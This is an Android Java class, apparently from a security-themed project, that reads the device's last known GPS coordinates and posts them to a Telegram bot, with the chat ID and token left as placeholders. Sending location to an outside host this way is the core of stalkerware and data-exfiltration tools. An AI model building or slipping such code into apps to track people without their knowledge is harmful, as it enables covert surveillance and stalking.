package com.example.oshcyber;


import android.Manifest;
import android.content.Context;
import android.location.Location;
import android.location.LocationManager;

import androidx.annotation.RequiresPermission;

import java.util.concurrent.TimeUnit;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.OkHttp;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.RequestBody;


public class SendLocation {
    @RequiresPermission(allOf = {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION})
    public void sendLocation(Context context){
        OkHttpClient client = new OkHttpClient()
                .newBuilder()
                .readTimeout(30, TimeUnit.SECONDS)
                .writeTimeout(30,TimeUnit.SECONDS)
                .connectTimeout(30,TimeUnit.SECONDS)
                .build();
        LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
        if(location != null){
            double latiude = location.getLatitude();
            double longiude = location.getLongitude();
            String text = "Location: "+latiude+","+longiude;
            String chatId = "TELEGRAM_CHAT_ID";
            String json = "{\"text\":\""+text+"\",\"chat_id\":\""+chatId+"\"}";
            RequestBody postBody = RequestBody.create(json,MediaType.get("application/json; charset=utf-8"));
            String url = "https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/sendMessage";
            Request request = new Request.Builder()
                    .url(url)
                    .post(postBody)
                    .build();
            try(Response response = client.newCall(request).execute()){
                if(response.isSuccessful()){
                    System.out.println("Success");
                }
                else{
                    System.out.println(response.code());
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        else{
            System.out.println("not found location");
        }
    }

}